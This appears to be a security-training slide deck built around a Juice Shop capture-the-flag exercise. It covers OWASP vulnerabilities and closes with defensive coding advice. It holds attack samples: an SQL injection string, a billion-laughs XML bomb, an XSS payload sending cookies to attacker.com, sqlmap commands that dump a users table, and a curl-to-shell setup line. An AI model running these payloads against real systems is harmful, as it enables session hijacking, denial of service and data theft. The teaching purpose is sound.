## Welcome !

```shell
curl -fsSL http://<the server ip>:81/kali-setup.sh | sh
```

---

### Hacking

Hacking is an unauthorized intrusion into a computer or an information system. The malicious hacker may alter system or security features to accomplish a goal that differs from the original purpose of the system.

### Ethical hacking

Ethical hacking refers to the act of locating weaknesses and vulnerabilities of computer and information systems by duplicating the actions of malicious hackers.

---

### Penetration testing

Penetration Testing (pentest) is designed to find the maxium of vulnerabilities. The tester attempts to exploit the vulnerabilities to ensure they are not false positives.

### Red team testing

Red team testing is similar to a pentest in many ways but is more targeted. Red team tests are testing the organization capabilities. The red team will try to get in and access sensitive information in any way possible, as quietly as possible.

---

### Kali Linux

Kali Linux is a Debian-derived Linux distribution designed for digital forensics and pentests.

It is loaded with more than 600 pentest programs, for instance:
 * nmap, a port scanner
 * wireshark, a network packet analyzer
 * John the ripper, a password cracker
 * Aircrack-ng, a wifi pentester

---

### Common web application vulnerabilities

----

#### Injection

When we use user-supplied data in a query, command, interpreter, etc.

Vulnerabilities:

```java
String query = "SELECT * FROM accounts WHERE custID='"
    + request.getParameter("id") + "'";

Query HQLQuery = session.createQuery("FROM accounts WHERE custID='"
    + request.getParameter("id") + "'");
```

Attack:
> http://example.com/app/accountView?id='or '1'='1

----

#### Broken Authentication

When we don't correctly implement authentication flow (technically and/or functionnaly).

Vulnerabilities:
 * Permits brute force, credential stuffing.
 * Permits default, well-known passwords: 'admin/admin', 'admin/admin123', etc.
 * Uses weak credential recovery/forgotten-password processes.

----

#### XML External Entities

When we accept XML input or XML uploads or we use user-supplied data in XML.

Attacks:
 * The attacker attempts a denial-of-service attack with a billion laughs attack:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

----

#### Broken Access Control

When we don't check that a user has the privileges and control to access the requested data.

Attacks:
 * The attacker change the account URL in his/her browser to access the account of someone else:
> http://myawesomeapp.net/account/234/edit
> http://myawesomeapp.net/account/356/edit

----

#### Cross-Site Scripting

When we forget to escape an untrusted source of data.

Attacks:
 * The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

```java
(String) page += "<input name='creditcard' type='TEXT' value='"
    + request.getParameter("CC") + "'>";
```

 The attacker modifies the ‘CC’ parameter in the browser to:

 ```javascript
 "><script>document.location="
    + "'http://www.attacker.com/cgi-bin/cookie.cgi"
    + "? foo='+document.cookie</script>"
 ```

This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

----

More information about web application vulnerabilities with [OWASP TOP 10](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf).

----

#### CVE

A CVE is a common name for a single security vulnerability so that we can identify and talk about issues sanely (e.g. "that OpenSSL vulnerability, from like 2009, the DoS one" vs. "CVE-2009-3555"). CVE allows multiple vendors, products, and customers to properly track security vulnerabilities and make sure they are dealt with.

ex: [CVE-2017-1653](https://duckduckgo.com/?q=CVE-2017-1653)

---

### The scenario

Your new client is a brand new healthcare software editor and it wants to comprise its well-etablished competitor: `Medical Software`. Your client asks two different teams to do the "dirty work", but only the most efficient will earn the cryptomoney pride.

Your team already tried a lot of remote attacks to gain access to the corporate network but everything failed, you decided to change your strategy.

----

You made a fake profile on a famous professional social network.

----

![profile](profile.png)

----

You discovered that a lot of Medical Software employees are sharing `Juice Shop` pages and promotions over the social network, you think it could be a good vector of attack.

---

### CTFd

To track the team progresses, your client set up a CTFd server, it is a Capture The Flag framework.

---

### Automated attacks

`nikto` is a web server scanner.

```
# update the database
nikto -update

# run the scan
nikto -host http://localhost:3000
```

`sqlmap` is an automatic SQL injection tool.

```
# extract critical information about the database
sqlmap --ignore-code=401 --url=http://localhost:3000/rest/user/login --data='{"email":"*", "password":"*"}' --level=5 --risk=3

# list the tables
sqlmap --ignore-code=401 --url=http://localhost:3000/rest/user/login --data='{"email":"*", "password":"*"}' --level=3 --risk=3 --tables --dbms=SQLite

# dump the Users table
sqlmap --ignore-code=401 --url=http://localhost:3000/rest/user/login --data='{"email":"*", "password":"*"}' --level=5 --risk=3 --dump -T Users --dbms=SQLite
```

---

## To trust or not to trust

----

> Can I trust that value and use it to build a SQL request?

No you can't!

Never build a SQL request dynamically, always use named parameters instead.

```java
// Don't
Query unsafeHQLQuery = session.createQuery("from Inventory where productID='"+userSuppliedParameter+"'");

// Do
Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");
safeHQLQuery.setParameter("productid", userSuppliedParameter);
```

[SQL Injection Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

----

> Can I trust that value and display its content in the html document?

No you can't!

Always sanitize and escape the value before displaying it. Check the possibilities of your frameworks (`ngSanitize`, `DomSanitizer`, `OWASP ESAPI`, etc.).

[XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)

----

> Can I trust my user and respond the document he/she is requesting?

No you can't!

Always check that the user is authorized to access the document.

----

> Can I trust that USB key I found in the parking lot earlier and plug it in my computer?

No you can't!

Don't plug an USB key you don't know. One tip to prevent USB infection is to lock your screen before pluging the USB key.
